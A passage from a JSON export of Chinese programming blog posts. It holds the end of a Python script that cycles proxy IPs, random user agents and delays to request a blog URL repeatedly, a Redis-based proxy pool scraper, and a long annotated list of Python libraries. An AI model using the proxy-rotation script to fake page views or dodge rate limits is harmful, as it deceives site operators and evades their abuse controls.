port=re.sub(r'&lt;td data-title=\"PORT\"&gt;|&lt;/td&gt;','',port_lits[i])\n        proxy='%s:%s' %(ip,port)\n        proxy_list.append(proxy)\n    return proxy_list\n\ndef Proxy_read(proxy_list,user_agent_list,i):\n    proxy_ip=proxy_list[i]\n    print ('当前代理ip：%s'%proxy_ip)\n    user_agent = random.choice(user_agent_list)\n    print('当前代理user_agent：%s'%user_agent)\n    sleep_time = random.randint(1,5)\n    print('等待时间：%s s' %sleep_time)\n    time.sleep(sleep_time)\n    print('开始获取')\n    headers = {\n        'User-Agent': user_agent\n    }\n\n    proxies={\n        'http': proxy_ip\n    }\n\n    url='https://www.baidu.com' #blog 地址\n\n    try:\n        req = requests.get(url, headers=headers, proxies=proxies, timeout=6,verify=False)\n        html=req.text\n        print (html)\n    except Exception as e:\n        print(e)\n        print('******打开失败！******')\n    else:\n        global count\n        count += 1\n        print('OK!总计成功%s次！' % count)\n\nif __name__ == '__main__':\n\n    proxy_list = Get_proxy_ip()\n\n    for i in range(100):\n\n        Proxy_read(proxy_list, user_agent_list, i)\n</code></pre>\n\n<p><br><br>\n </p>\n                                    </div>", "log_PostTime": 1584891281, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python使用Redis实现IP代理池", "log_Intro": "Python使用Redis实现IP代理池", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>可以使用快代理，芝麻代理，蘑菇代理 ，讯代理等代理商提供API代理IP或者免费代理建立自己IP代理池</p>\n\n<pre>\n<code class=\"language-python\">#使用apscheduler库定时爬取ip，定时检测ip删除ip，做了2层检测，第一层爬取后放入redis——db0进行检测，成功的放入redis——db1再次进行检测，确保获取的代理ip的可用性\n\nimport requests, redis\nimport pandas\nimport random\n\nfrom apscheduler.schedulers.blocking import BlockingScheduler\nimport datetime\nimport logging\n\ndb_conn = redis.ConnectionPool(host=\"*.*.*.*\", port=6379, password=\"123456\")\nredis_conn_0 = redis.Redis(connection_pool=db_conn, max_connections=10,db=0)\nredis_conn_1 = redis.Redis(connection_pool=db_conn, max_connections=10,db=1)\n\n\n# 删除redis数据库里的ip\ndef remove_ip(ip,redis_conn):\n    redis_conn.zrem(\"IP\", ip)\n    print(\"已删除 %s...\" % ip)\n\n\n# 获取redis数据库里一共有多少ip\ndef get_ip_num(redis_conn):\n    num = redis_conn.zcard(\"IP\")\n    return num\n\n\n# 获取ip的端口\ndef get_port(ip,redis_conn):\n    port = redis_conn.zscore(\"IP\", ip)\n    port = str(port).replace(\".0\", \"\")\n    return port\n\n\n# 添加ip和端口到数据库里\ndef add_ip(ip, port,redis_conn):\n    # nx: 不要更新已有的元素。总是添加新的元素,只有True，False\n    redis_conn.zadd(\"IP\", {ip: port}, nx=55)\n    print(\"已添加 %s %s...ok\" % (ip, port))\n\n\n# 列出所有的ip\ndef get_all_ip(redis_conn):\n    all_ip = redis_conn.zrange(\"IP\", 0, -1)\n    return all_ip\n\n\n# 随机获取一个ip\ndef get_random_ip(redis_conn):\n    end_num = get_ip_num(redis_conn)\n    num = random.randint(0, end_num)\n    random_ip = redis_conn.zrange(\"IP\", num, num)\n    if not random_ip:\n        return \"\",\"\"\n    random_ip = str(random_ip[0]).replace(\"b\", '').replace(\"'\", \"\")\n    port = get_port(random_ip,redis_conn)\n    return random_ip, port\n\n\n# 获取代理ip\ndef spider_ip(x,redis_conn):\n    print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), x)\n    for p in range(1, 20):\n        res = pandas.read_html(\"http://www.89ip.cn/index_{}.html\".format(p))\n        # print(res)\n        # print(type(res[0]))\n        for i in range(len(res[0])):\n            ip = res[0].iloc[i, 0]\n            port = res[0].iloc[i, 1]\n            print(\"ip\", ip)\n            print(\"port\", port)\n            add_ip(str(ip), str(port),redis_conn)\n\n\nlogging.basicConfig(level=logging.INFO,\n                    format='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s',\n                    datefmt='%Y-%m-%d %H:%M:%S',\n                    filename='log1.txt',\n                    filemode='a')\n\n\ndef aps_detection_ip(x,redis_conn):\n    print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), x)\n    res=get_random_ip(redis_conn)\n    ip=res[0]\n    port=res[1]\n    try:\n        requests.get(\"http://www.baidu.com\",proxies={'https':'{ip}:{port}'.format(ip=ip,port=port)})\n        print(\"可用\",ip,port,res)\n        if redis_conn!=redis_conn_1:\n            add_ip(str(ip), str(port), redis_conn_1)\n    except Exception:\n        # ip错误失效就删除\n        remove_ip(ip,redis_conn)\n\n\nscheduler = BlockingScheduler()\nscheduler.add_job(func=aps_detection_ip, args=('检测循环任务0',redis_conn_0), trigger='interval', seconds=3, id='aps_detection_ip_task0',max_instances=10)\nscheduler.add_job(func=spider_ip, args=('获取循环任务0',redis_conn_0), trigger='interval', seconds=60*60*2, id='spider_ip_task0',max_instances=10)\n\nscheduler.add_job(func=aps_detection_ip, args=('检测循环任务1',redis_conn_1), trigger='interval', seconds=3, id='aps_detection_ip_task1',max_instances=10)\n\nscheduler._logger = logging\n\n# scheduler.start()\nif __name__ == '__main__':\n    # print(get_ip_num())\n    # spider_ip(\"获取循环任务\")\n    scheduler.start()\n    # aps_detection_ip(\"检测循环任务\")</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891282, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python库全部整理出来了，非常全面", "log_Intro": "Python库全部整理出来了，非常全面", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>库名称简介</p>\n\n<p>Chardet 字符编码探测器，可以自动检测文本、网页、xml的编码。</p>\n\n<p>colorama 主要用来给文本添加各种颜色，并且非常简单易用。</p>\n\n<p>Prettytable 主要用于在终端或浏览器端构建格式化的输出。</p>\n\n<p>difflib，[Python]标准库，计算文本差异Levenshtein，快速计算字符串相似度。</p>\n\n<p>fuzzywuzzy 字符串模糊匹配。</p>\n\n<p>esmre 正则表达式的加速器。</p>\n\n<p>shortuuid 一组简洁URL/UUID函数库。</p>\n\n<p>ftfy，Unicode文本工具7</p>\n\n<p>unidecode，ascii和Unicode文本转换函数。</p>\n\n<p>xpinyin，将汉字转换为拼音的函数库</p>\n\n<p>pangu.py，调整对中日韩文字当中的字母、数字间距。</p>\n\n<p>pyfiglet，Python写的figlet程序，使用字符组成ASCII艺术图片</p>\n\n<p>uniout，提取字符串中可读写的字符</p>\n\n<p>awesome slugify，一个Python slugify库，用于处理Unicode。</p>\n\n<p>python-slugify，转换Unicode为ASCII内码的slugify函数库。</p>\n\n<p>unicode-slugify，生成unicode内码，Django的依赖包。</p>\n\n<p>ply，Python版的lex和yacc的解析工具phonenumbers，解析电话号码，格式，存储和验证的国际电话号码。</p>\n\n<p>python-user-agents，浏览器的用户代理（user-agents）的解析器。</p>\n\n<p>sqlparse，SQL解析器。</p>\n\n<p>pygments，一个通用的语法高亮工具。</p>\n\n<p>python-nameparser，解析人名，分解为单独的成分。</p>\n\n<p>pyparsing，通用解析器生成框架。</p>\n\n<p>tablib，表格数据格式，包括，XLS、CSV，JSON，YAML。</p>\n\n<p>python-docx，docx文档读取，查询和修改，微软Word 2007 / 2008的docx文件。</p>\n\n<p>xlwt/xlrd，读写Excel格式的数据文件。</p>\n\n<p>xlsxwriter，创建Excel格式的xlsx文件。</p>\n\n<p>xlwings，利用Python调用Excelcsvkit，CSV文件工具包。</p>\n\n<p>marmir，把Python[数据结构]，转化为电子表格。</p>\n\n<p>pdfminer，从PDF文件中提取信息。</p>\n\n<p>pypdf2， 合并和转换PDF页面的函数库。</p>\n\n<p>Python-Markdown，轻量级标记语言Markdown的Python实现。</p>\n\n<p>Mistune，,快速、全功能的纯Python编写的Markdown解释器。</p>\n\n<p>dateutil，标准的Python官方datetime模块的扩展包，字符串日期工具，其中parser是根据字符串解析成</p>\n\n<p>datetime，而rrule是则是根据定义的规则来生成datetime。</p>\n\n<p>arrow,更好的日期和时间处理Python库</p>\n\n<p>chronyk，一个Python 3版函数库，用于解析人写的时间和日期。</p>\n\n<p>delorean，清理期时间的函数库。</p>\n\n<p>when.py，为见的日期和时间，提供人性化的功能。</p>\n\n<p>moment，类似Moment.js的日期/时间Python库</p>\n\n<p>pytz，世界时区，使用tz database时区信息[数据库]</p>\n\n<p>BeautifulSoup，基于Python的HTML/XML解析器，简单易用, 功能很强大,即使是有bug，有问题的html代码，也可以解析。</p>\n\n<p>lxml，快速，易用、灵活的HTML和XML处理库，功能超强，在遇到有缺陷、不规范的xml时，Python自带的xml处理器可能无法解析。报错时，程序会尝试再用lxml的修复模式解析。</p>\n\n<p>htmlparser，官方版解析HTML DOM树，偶尔搞搞命令行自动表单提交用得上。</p>\n\n<p>pyyaml，Python版本的YAML解释器。</p>\n\n<p>html5lib，-标准库，解析和序列化HTML文档和片段。</p>\n\n<p>pyquery，类似[jQuery]的的HTML解释器函数库。</p>\n\n<p>cssutils，Python CSS库。</p>\n\n<p>MarkupSafe，XML或HTML / XHTML安全字符串标记工具。</p>\n\n<p>cssutils - ACSS library for Python., MarkupSafe - Implements a XML/HTML/XHTMLbleach，漂白，基于HTML的白名单函数库。</p>\n\n<p>xmltodict，类似JSON的XML工具包。</p>\n\n<p>xhtml2pdf，HTML / CSS格式转换器，看生成pdf文档。</p>\n\n<p>untangle，把XML文档，转换为Python对象，方便访问。</p>\n\n<p>文件处理</p>\n\n<p>库名称简介Mimetypes，Python标准库，映射文件名到MIME类型。</p>\n\n<p>imghdr，Python标准库，确定图像类型。</p>\n\n<p>python-magic，libmagic文件类型识别库，Python接口格式。</p>\n\n<p>path.py，os.path模块的二次封装。</p>\n\n<p>watchdog，一组API和shell实用程序，用于监视文件系统事件。</p>\n\n<p>Unipath，面向对象的文件/目录的操作工具包。</p>\n\n<p>pathlib，-（Python 3.4版已经作为Python标准库），一个跨平台，面向path的函数库。pickle/cPickle,python的pickle模块实现了基本的数据序列和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。</p>\n\n<p>cPickle是[C语言]实现的版本，速度更快。</p>\n\n<p>ConfigParser，Python标准库，INI文件解析器。</p>\n\n<p>configobj，INI文件解析器。</p>\n\n<p>config，分层次配置，logging作者编写。</p>\n\n<p>profig，多格式配置转换工具。</p>\n\n<p>logging，Python标准库，日志文件生成管理函数库。</p>\n\n<p>logbook，logging的替换品。</p>\n\n<p>Sentry，实时log服务器。</p>\n\n<p>Raven，哨兵Sentry的Python客户端。</p>\n\n<p>Sphinx，斯芬克斯（狮身人面像），Python文档生成器。</p>\n\n<p>reStructuredText，标记语法和解析工具，Docutils组件。</p>\n\n<p>mkdocs，Markdown格式文档生成器。</p>\n\n<p>pycco，简单快速、编程风格的文档生成器。</p>\n\n<p>pdoc，自动生成的Python库API文档epydoc，从源码注释中生成各种格式文档的工具</p>\n\n<p>图像处理</p>\n\n<p>库名称简介PIL（Python Image Library），基于Python的图像处理库，功能强大，对图形文件的格式支持广泛，内置许多图像处理函数，如图像增强、滤波[算法]等。</p>\n\n<p>Pillow，图像处理库，PIL图像库的分支和升级替代产品。</p>\n\n<p>Matplotlib，著名的绘图库，提供了整套和matlab相似的命令API，用以绘制一些高质量的数学二维图形，十分适合交互式地进行制图。</p>\n\n<p>brewer2mpl，有一个专业的python配色工具包，提供了从美术角度来讲的精美配色。</p>\n\n<p>PyGame基于Python的多媒体开发和游戏软件开发模块，包含大量游戏和图像处理功能。</p>\n\n<p>Box2d，开源的2d物理引擎，愤怒的小鸟就是使用了这款物理引擎进行开发的，Box2d物理引擎内部模拟了一个世界，你可以设置这个世界里的重力，然后往这个世界里添加各种物体，以及他们的一些物理特性，比如质量，摩擦，阻尼等等。</p>\n\n<p>Pymunk，类似box2d的开源物理图形模拟库。</p>\n\n<p>OpenCV, 目前最好的开源图像/视觉库，包括图像处理和计算机视觉方面、[机器学习]的很多通用算法。</p>\n\n<p>SimpleCV，计算机视觉开源框架，类似opencv。</p>\n\n<p>VTK，视觉化工具函式库（VTK， Visualization Toolkit）是一个开放源码，跨平台、支援平行处理（VTK曾用于处理大小近乎1个Petabyte的资料，其平台为美国Los Alamos国家实验室所有的具1024个处理器之大型系统）的图形应用函式库。2005年时曾被美国陆军研究实验室用于即时模拟俄罗斯制反导弹战车ZSU23-4受到平面波攻击的情形，其计算节点高达2.5兆个之多。</p>\n\n<p>cgkit,Python Computer Graphics Kit,其module 主要分两个部分</p>\n\n<p>1. 与3d相关的一些python module 例如the vector, matrix and quaternion types, the RenderMan bindings, noise functions 这些模块可以在maya houdini nuke blender 等有Python扩展的程序中直接用;</p>\n\n<p>2. 提供完整的场景操作的module， 他类似其他三维软件，在内存中保留完整的描述场景的信息。不能直接用于maya 等。</p>\n\n<p>CGAL，Computational Geometry Algorithms Library，计算几何算法库，提供计算几何相关的数据结构和算法，诸如三角剖分（2D约束三角剖分及二维和三维Delaunay三角剖分），Voronoi图（二维和三维的点，2D加权Voronoi图，分割Voronoi图等），多边形（布尔操作，偏置），多面体（布尔运算），曲线整理及其应用，网格生成（二维Delaunay网格生成和三维表面和体积网格生成等），几何处理（表面网格简化，细分和参数化等），凸壳算法（2D，3D和dD），搜索结构（近邻搜索，kd树等），插值，形状分析，拟合，距离等。</p>\n\n<p>Aggdraw，开源图像库，几乎涵盖了2d image操作的所有功能，使用起来非常灵活。</p>\n\n<p>Pycairo,开源矢量绘图库</p>\n\n<p>Cairo开罗的python接口，cairo提供在多个背景下做2-D的绘图，高级的更可以使用硬件加速功能。</p>\n\n<p>wand，Python绑定魔杖工具（MagickWand），C语言API接口。</p>\n\n<p>thumbor， -智能成像工具，可调整大小和翻转图像。</p>\n\n<p>imgSeek，查询相似的图像。</p>\n\n<p>python-qrcode，纯Python的二维码（QR码）生成器。</p>\n\n<p>pyBarcode，创建条码，无需PIL模块。</p>\n\n<p>pygram，Instagram像图像过滤器。</p>\n\n<p>Quads，基于四叉树的计算机艺术。</p>\n\n<p>nude.py，裸体检测函数。</p>\n\n<p>scikit-image，scikit工具箱的图像处理库。</p>\n\n<p>hmap，图像直方图工具。</p>\n\n<p>bokeh，交互的Web绘图。</p>\n\n<p>plotly，Web协同的Python和Matplotlib绘制。</p>\n\n<p>vincent，文森特，Python Vega的函数库。</p>\n\n<p>d3py，Python绘图库，基于D3.JS, ggplot -API兼容R语言的ggplot2.Kartograph.py，在Python绘制漂亮的SVG地图。</p>\n\n<p>pygal， SVG图表的创造者。</p>\n\n<p>pygraphviz，Graphviz的Python接口。</p>\n\n<p>Fonttlools，ttf字体工具函数包，用于fontforge、ttx等字体软件。</p>\n\n<p>游戏和多媒体</p>\n\n<p>库名称简介audiolazy，数字信号处理（DSP）的Python工具包。</p>\n\n<p>audioread，跨平台（GStreamer + Core Audio + MAD + FFmpeg）音频解码库。</p>\n\n<p>beets，音乐库管理。dejavu，音频指纹识别算法。</p>\n\n<p>Dejavu 听一次音频后就会记录该音频的指纹信息，然后可通过麦克风对输入的音频进行识别是否同一首歌。</p>\n\n<p>django-elastic-transcoder,Django +亚马逊elastic转码。</p>\n\n<p>eyeD3,音频文件工具，特别是MP3文件包含的ID3元数据。</p>\n\n<p>id3reader，用于读取MP3的元数据。</p>\n\n<p>mutagen，处理音频元数据。</p>\n\n<p>pydub，-操纵音频和简单的高层次的接口。</p>\n\n<p>pyechonest，Echo Nest API客户端。</p>\n\n<p>talkbox，语音和信号处理的Python库。</p>\n\n<p>TimeSide，开放的网络音频处理框架。</p>\n\n<p>tinytag，读取音乐文件元数据，包括的MP3，OGG，FLAC和wave文件。</p>\n\n<p>m3u8，用于解析m3u8文件。</p>\n\n<p>moviepy，多格式视频编辑脚本模块，包括GIF动画。</p>\n\n<p>shorten.tv，视频摘要。scikit视频，SciPy视频处理例程。</p>\n\n<p>GeoDjango,一个世界级的地理Web框架。</p>\n\n<p>geopy,Geo地理编码的工具箱。</p>\n\n<p>pygeoip，纯Python写的GeoIP API。</p>\n\n<p>GeoIP，Python API接口，使用高精度GeoIP Legacy Database数据库。</p>\n\n<p>geojson，GeoJSON函数库django-countries，一个Django程序，提供国家选择，国旗图标的静态文件，和一个国家的地域模型。</p>\n\n<p>Pygame，Python游戏设计模块。</p>\n\n<p>Cocos2d，2D游戏框架，演示，和其他的图形/交互应用，基于pyglet。Cocos2d- cocos2d is a framework for building 2D games, demos, and other graphical/interactive applications. It is based on pyglet.,PySDL2，SDL2的封装库。</p>\n\n<p>Panda3D- 3D游戏引擎，迪士尼开发。用C++写的，完全兼容Python。</p>\n\n<p>PyOgre，OGRE 3D渲染引擎，可用于游戏，模拟，任何3D。</p>\n\n<p>PyOpenGL，绑定OpenGL和它相关的API。</p>\n\n<p>PySFML，Python绑定SFMLRenPy，视觉小说引擎。</p>\n\n<p>大数据与科学计算</p>\n\n<p>库名称简介pycuda/opencl，GPU高性能并发计算Pandas，python实现的类似R语言的数据统计、分析平台。基于NumPy和Matplotlib开发的，主要用于数据分析和数据可视化，它的数据结构DataFrame和R语言里的data.frame很像，特别是对于时间序列数据有自己的一套分析机制，非常不错。</p>\n\n<p>Open Mining，商业智能（BI），Pandas的Web界面。</p>\n\n<p>blaze，NumPy和Pandas大数据界面。</p>\n\n<p>SciPy，开源的Python算法库和数学工具包，SciPy包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。其功能与软件MATLAB、Scilab和GNU Octave类似。Numpy和Scipy常常结合着使用，Python大多数机器学习库都依赖于这两个模块。</p>\n\n<p>ScientificPython，一组经过挑选的Python程序模块，用于科学计算，包括几何学（矢量、张量、变换、矢量和张量场），四元数，自动求导数，（线性）插值，多项式，基础统计学，非线性最小二乘拟合，单位计算，Fortran兼容的文本格式，通过VRML的3D显示，以及两个Tk小工具，分别用于绘制线图和3D网格模型。此外还具有到netCDF，MPI和BSPlib库的接口。</p>\n\n<p>NumPy科学计算库，提供了矩阵，线性代数，傅立叶变换等等的解决方案, 最常用的是它的N维数组对象. NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。</p>\n\n<p>Cvxopt，最优化计算包，可进行线性规划、二次规划、半正定规划等的计算。</p>\n\n<p>Numba，科学计算速度优化编译器。</p>\n\n<p>pymvpa2，是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。</p>\n\n<p>NetworkX，复杂网络的优化软件包。</p>\n\n<p>zipline，交易算法的函数库。</p>\n\n<p>PyDy， Python动态建模函数库。</p>\n\n<p>SymPy,符号数学的Python库。</p>\n\n<p>statsmodels,Python的统计建模和计量经济学。</p>\n\n<p>astropy,天文学界的Python库。</p>\n\n<p>orange，橙色，数据挖掘，数据可视化，通过可视化编程或Python脚本学习机分析。RDKit,化学信息学和机器学习的软件。</p>\n\n<p>Open Babel，巴贝尔，开放的化学工具箱。</p>\n\n<p>cclib，化学软件包的计算函数库。</p>\n\n<p>Biopython，免费的生物计算工具包。</p>\n\n<p>bccb，生物分析相关的代码集。</p>\n\n<p>bcbio-nextgen，提供完全自动化、高通量、测序分析的工具包。</p>\n\n<p>visvis, 可视化计算模块库，可进行一维到四维数据的可视化。</p>\n\n<p>MapReduce是Google提出的一个软件[架构]，用于大规模数据集（大于1TB）的并行运算。概念“Map（映射）”和“Reduce（归纳）”，及他们的主要思想，都是从函数式编程语言借来的MapReduce函数库。</p>\n\n<p>Framworks and libraries for MapReduce.,PySpark，[Spark]的Python API。dpark，Spark的Python克隆，Python中的MapReduce框架。</p>\n\n<p>luigi，为批量工作，建立复杂的管道。</p>\n\n<p>mrjob，运行在[Hadoop]，或亚马逊网络服务的，MapReduce工作。</p>\n\n<p>人工智能与机器学习</p>\n\n<p>库名称简介NLTK（natural language toolkit)，是python的自然语言处理工具包。2001年推出，包括了大量的词料库，以及自然语言处理方面的算法实现：分词， 词根计算， 分类， 语义分析等。</p>\n\n<p>Pattern，数据挖掘模块，包括自然语言处理，机器学习工具，等等。</p>\n\n<p>textblob，提供API为自然语言处理、分解NLP任务。基于NLTK和Pattern模块。</p>\n\n<p>jieba，结巴，中文分词工具。</p>\n\n<p>snownlp，用于处理中文文本库。</p>\n\n<p>loso，中文分词函数库。</p>\n\n<p>genius，中文CRF基础库，条件随机场(conditional random field,简称 CRF),是一种鉴别式机率模型,是随机场的一种,常用于标注或分析序列资料,如自然语言文字或是生物序列。</p>\n\n<p>Gensim，一个相当专业的主题模型Python工具包，无论是代码还是文档，可用于如何计算两个文档的相似度LIBSVM,是台湾大学林智仁(Lin Chih-Jen)教授等开发设计的一个简单、易于使用和快速有效的SVM模式识别与回归的软件包，他不但提供了编译好的可在Windows系列系统的执行文件，还提供了源代码，方便改进、修改以及在其它[操作系统]上应用；该软件对SVM所涉及的参数调节相对比较少，提供了很多的默认参数，利用这些默认参数可以解决很多问题；并提供了交互检验(Cross Validation)的功能。该软件可以解决C-SVM、ν-SVM、ε-SVR和ν-SVR等问题，包括基于一对一算法的多类模式识别问题。</p>\n\n<p>scikits.learn，构建在SciPy之上用于机器学习的 Python 模块。它包括简单而高效的工具，可用于数据挖掘和数据分析。涵盖分类，回归和聚类算法，例如SVM， 逻辑回归，朴素贝叶斯，随机森林，k-means等算法，代码和文档都非常不错，在许多Python项目中都有应用。例如在我们熟悉的NLTK中，分类器方面就有专门针对scikit-learn的接口，可以调用scikit-learn的分类算法以及训练数据来训练分类器模型。</p>\n\n<p>PyMC，机器学习采样工具包，scikit-learn似乎是所有人的宠儿，有人认为，PyMC更有魅力。PyMC主要用来做Bayesian分析。</p>\n\n<p>Orange，基于组件的数据挖掘和机器学习软件套装，它的功能即友好，又很强大，快速而又多功能的可视化编程前端，以便浏览数据分析和可视化，包含了完整的一系列的组件以进行数据预处理，并提供了数据帐目，过渡，建模，模式评估和勘探的功能。侧重数据挖掘，可以用可视化语言或Python进行操作，拥有机器学习组件，还具有生物信息学以及文本挖掘的插件。</p>\n\n<p>Milk，机器学习工具箱，其重点是提供监督分类法与几种有效的分类分析：SVMs(基于libsvm)，K-NN，随机森林经济和决策树。它还可以进行特征选择。这些分类可以在许多方面相结合，形成不同的分类系统。对于无监督学习，它提供K-means和affinity propagation聚类算法。</p>\n\n<p>PyMVPA(Multivariate Pattern Analysis in Python),是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。</p>\n\n<p>NuPIC，开源人工智能平台。该项目由Grok（原名 Numenta）公司开发，其中包括了公司的算法和软件架构。NuPIC 的运作接近于人脑，“当模式变化的时候，它会忘掉旧模式，记忆新模式”。如人脑一样，CLA 算法能够适应新的变化。</p>\n\n<p>Pylearn2，-基于Theano的机器学习库。</p>\n\n<p>hebel，GPU加速，[深度学习]Python库。</p>\n\n<p>gensim，机器学习库。</p>\n\n<p>pybrain，机器学习模块，它的目标是为机器学习任务提供灵活、易应、强大的机器学习算法。pybrain包括神经网络、强化学习(及二者结合)、无监督学习、进化算法。以神经网络为核心，所有的训练方法都以神经网络为一个实例Mahout,是 Apache Software Foundation（ASF） 旗下的一个开源项目，提供一些可扩展的机器学习领域经典算法的实现，旨在帮助开发人员更加方便快捷地创建智能应用程序。Mahout包含许多实现，包括聚类、分类、推荐过滤、频繁子项挖掘。此外，通过使用 Apache Hadoop 库，Mahout 可以有效地扩展到云中。</p>\n\n<p>Crab，灵活的，快速的推荐引擎。</p>\n\n<p>python-recsys，娱乐系统分析，推荐系统。</p>\n\n<p>vowpal_porpoise，Vowpal Wabbit轻量级Python封装。</p>\n\n<p>Theano,用来定义、优化和模拟数学表达式计算，用于高效的解决多维数组的计算问题的python软件包。它使得写深度学习模型更加容易，同时也给出了一些关于在GPU上训练它们的选项。</p>\n\n<p>系统与命令行</p>\n\n<p>库名称简介threading，Python标准线程库，更高级别的线程接口。</p>\n\n<p>envoy，特使，Python子线程的函数库。</p>\n\n<p>sh，成熟的子线程替换函数库。</p>\n\n<p>sarge，封装线程。</p>\n\n<p>subprocess,调用shell命令的神器argparse，写命令行脚本必备，强大的命令行差数解析工具timeit，计算代码运行的时间等等unp，命令行工具，解压文件。</p>\n\n<p>eventlet开销很少的多线程模块，使用的是 green threads 概念，例如，pool = eventlet.GreenPool(10000) 这样一条语句便创建了一个可以处理 10000 个客户端连接的线程池。类似Gevent线程库Gevent，多线程模块pytools,著名的python通用函数、工具包SendKeys, 键盘鼠标操作模块, 模拟键盘鼠标模拟操作。</p>\n\n<p>pyHook,基于Python的“钩子”库，主要用于监听当前电脑上鼠标和键盘的事件。这个库依赖于另一个Python库PyWin32，如同名字所显示的，PyWin32只能运行在Windows平台，所以PyHook也只能运行在Windows平台。</p>\n\n<p>pstuil,跨平台地很方便获取和控制系统的进程，以及读取系统的CPU占用内存占用等信息.</p>\n\n<p>cement，一个轻量级的、功能齐全的命令行工具</p>\n\n<p>click，简单优雅的的命令行接口。</p>\n\n<p>clint，Python命令行工具。</p>\n\n<p>cliff，创造多层次指令的命令行程序框架。</p>\n\n<p>Clime， 可以转换任何模块为多的CLI命令程序，无任何配置。</p>\n\n<p>docopt，Python命令行参数分析器。</p>\n\n<p>pycli，命令行应用程序，支持的标准命令行解析，测井，单元[测试]和功能测试。</p>\n\n<p>Gooey，打开命令行程序，作为为一个完整的GUI应用程序,cookiecutter，命令行工具，从cookiecutters（项目模板）创建项目。例如，Python包项目，jQuery插件项目。percol，为UNIX传统管道pipe命令，添加交互式选择风格。</p>\n\n<p>rainbowstream，聪明和漂亮的推特客户终端。</p>\n\n<p>Django Models，Django的一部分SQLAlchemy，Python SQL工具包和对象关系映射。</p>\n\n<p>peewee，小型的ORM解析器。</p>\n\n<p>PonyORM，为ORM提供了一种面向SQL的接口。</p>\n\n<p>MongoEngine，Python对象文件映射，使用[MongoDB]。, Django MongoDB引擎MongoDB , Django后台。</p>\n\n<p>django-mongodb-engine，Django后台.redisco,一个简单的模型和容器库，使用[Redis]flywheel，Amazon DynamoDB对象映射。</p>\n\n<p>butterdb，谷歌电子表格的ORM，Python版。</p>\n\n<p>celery，芹菜，异步任务队列/工作，基于分布式消息队列。</p>\n\n<p>huey，休伊，轻量级，多线程任务队列。</p>\n\n<p>mrq，队列先生，分布式任务队列，使用redis &amp; Gevent。</p>\n\n<p>rq，简单的工作队列。</p>\n\n<p>Queue,Queue模块可以用来实现多线程间通讯，让各个线程共享数据，生产者把货物放到Queue中，供消费者（线程）去使用。</p>\n\n<p>simpleq，简单的，可扩展的队列，Amazon SQS基础队列。</p>\n\n<p>Psyco，超强的python性能优化工具，psyco 的神奇在于它只需要在代码的入口处调用短短两行代码，性能就能提升 40% 或更多，真可谓是立竿见影！如果你的客户觉得你的程序有点慢，敬请不要急着去优化代码，psyco 或许能让他立即改变看法。psyco 堪称 Python 的 jit。fn.py，Python函数编程：缺失的功能享受FP的实现。</p>\n\n<p>funcy，函数编程工具。</p>\n\n<p>Toolz，函数编程工具：迭代器、函数，字典。</p>\n\n<p>CyToolz，Toolz的Cython实现，高性能的函数编程工具。</p>\n\n<p>Ansible，安塞波，极为简单的自动化平台。</p>\n\n<p>SaltStack，基础设施的自动化管理系统。</p>\n\n<p>Fabric，织物，一个简单，远程执行和部署的语言工具。</p>\n\n<p>Fabtools，Fabric的工具函数。</p>\n\n<p>cuisine，热门的Fabric的工具函数。</p>\n\n<p>psutil，跨平台的过程和系统工具模块。</p>\n\n<p>pexpect，控制互动节目。</p>\n\n<p>provy，易于使用的配置系统的Python。</p>\n\n<p>honcho，Foreman的Python接口，用于管理procfile应用工具。</p>\n\n<p>gunnery，多任务执行工具，与网络接口的分布式系统。</p>\n\n<p>fig，快速。独立的开发环境中使用泊坞窗。</p>\n\n<p>APScheduler，轻量级、但功能强大的在线任务调度程序。</p>\n\n<p>django-schedule,Django日程应用程序。</p>\n\n<p>doit,任务流道/生成工具。</p>\n\n<p>Joblib,Python提供的轻量级的流水线工具函数。</p>\n\n<p>Plan，简易生成crontab文件。</p>\n\n<p>Spiff，纯Python实现的，功能强大的工作流引擎。</p>\n\n<p>schedule，Python作业调度。</p>\n\n<p>TaskFlow，有助于使任务执行简单。</p>\n\n<p>ctypes，Python标准库，速度更快，Python调用C代码的外部函数接口。</p>\n\n<p>cffi，Python调用C代码外部函数接口，类似于ctypes直接在python程序中调用c程序,但是比ctypes更方便不要求编译成so再调用。</p>\n\n<p>Cytoolz，python 加速库SWIG，简化封装和接口生成器。</p>\n\n<p>Cython，Python优化静态编译器。</p>\n\n<p>PyPy，Python解释器的 Python实现。</p>\n\n<p>Stackless Python，一个增强版本的Python。它使程序员从基于线程的编程方式中获得好处，并避免传统线程所带来的性能与复杂度问题。Stackless为 Python带来的微线程扩展，是一种低开销、轻量级的便利工具Pyston,使用LLVM和现代JIT技术,对python进行性能优化。</p>\n\n<p>pythonlibs，非官方的Windows（32 / 64位）的Python扩展包scapy，优秀的数据包处理库。</p>\n\n<p>ino，Arduino命令行工具。</p>\n\n<p>Pyro，Python的机器人工具包。</p>\n\n<p>pluginbase，一个简单而灵活的Python的插件系统。</p>\n\n<p>itsdangerous，数据安全传输工具。</p>\n\n<p>blinker，快速Python中的信号/事件调度系统。</p>\n\n<p>pychievements，用于创建和跟踪成果框架。</p>\n\n<p>python-patterns，Python中的设计模式。</p>\n\n<p>pefileWindows 